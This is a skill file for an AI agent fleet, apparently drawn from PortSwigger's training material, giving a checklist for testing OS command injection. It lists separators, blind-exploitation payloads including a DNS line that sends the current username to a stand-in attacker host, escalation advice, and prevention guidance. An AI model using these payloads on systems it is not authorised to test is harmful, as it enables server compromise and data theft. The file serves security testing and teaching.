---
name: offensive-command-injection
description: "OS command injection (shell injection) checklist: injecting shell metacharacters into server-side commands, blind exploitation via time delays / output redirection / out-of-band DNS exfiltration, command separators per platform, and prevention via whitelist validation. Use for testing product features that shell out (stock checkers, report generators, mailers)."
---

# SKILL: OS Command Injection

## Metadata
- **Skill Name**: command-injection
- **Folder**: offensive-command-injection
- **Source**: PortSwigger Web Security Academy — OS command injection (https://portswigger.net/web-security/os-command-injection)

## Description
OS command injection (shell injection) checklist: injecting shell metacharacters into server-side commands, blind exploitation via time delays, output redirection, and out-of-band DNS exfiltration, command separators per platform, and prevention via whitelist validation. Use for testing product features that shell out (stock checkers, report generators, mailers).

## Trigger Phrases
Use this skill when the conversation involves any of:
`command injection, shell injection, os command, shell metacharacter, command separator, blind command injection, time delay command, out-of-band command, backtick injection, dollar parenthesis execution`

## Description (Full)
OS command injection allows an attacker to execute operating system commands on the server running the application, typically fully compromising the application and its data, then pivoting via trust relationships to other internal systems.

## Full Methodology

# OS Command Injection

## Shortcut

- Spot any feature that appears to shell out to a legacy system (stock checks, report generation, mail sending, file conversion).
- Inject a command separator plus a harmless probe (`& echo test &`, `| echo test`, backticks) into every parameter feeding that feature.
- Confirm in-band output when possible; for blind cases use time delays (`& ping -c 10 127.0.0.1 &`), output redirection into the web root, or out-of-band DNS lookups (`& nslookup `whoami`.attacker.com &`).
- Escalate: read files, exfiltrate data via DNS subdomain encoding, pivot to internal infrastructure.

## How vulnerabilities arise

The application passes user-controllable data into a command executed by a shell:

```
stockreport.pl 381 29          # stock check by ID
& echo aiwefwlguh &            # injected via productID
```

Result: three commands run — the original (now broken), the injected one, and the leftover argument as a command.

## Command separators

Work on both Windows and Unix:

- `&`
- `&&`
- `|`
- `||`

Unix-only:

- `;`
- newline (0x0a)

Unix inline execution:

- `` ` injected command ` `` (backticks)
- `$(injected command)`

Behavior differs subtly between separators — some allow in-band output retrieval, others only blind exploitation. If input lands inside quotation marks in the original command, terminate the quoted context (`"` or `'`) first, then inject.

## Blind exploitation techniques

1. **Time delays** — `& ping -c 10 127.0.0.1 &` controls response time precisely.
2. **Output redirection** — `& whoami > /var/www/static/whoami.txt &` then fetch the file via the browser.
3. **Out-of-band (OAST)** — `& nslookup `whoami`.kgji2ohoyw.web-attacker.com &` — the DNS lookup both confirms execution and exfiltrates output (here: the current username as a subdomain).

## Useful first commands

| Purpose | Linux | Windows |
|---|---|---|
| Current user | `whoami` | `whoami` |
| OS | `uname -a` | `ver` |
| Network config | `ifconfig` | `ipconfig /all` |
| Connections | `netstat -an` | `netstat -an` |
| Processes | `ps -ef` | `tasklist` |

## Prevention

- Best: never call OS commands from application-layer code — use platform APIs.
- If unavoidable: whitelist-validate inputs (exact values, numbers, or strict alphanumerics).
- Never try to escape shell metacharacters by hand — too error-prone.

## Notes for the fleet

- Solidity/fork hunts rarely shell out, but the triage LLM prompts for DeFi dashboards, bot infrastructure, and off-chain components benefit from this checklist when reviewing backend code that handles user input.
- The OAST pattern (confirm + exfiltrate in one DNS interaction) generalizes: the fleet's own out-of-band verification habit (fork probe confirms before reporting) is the same discipline.
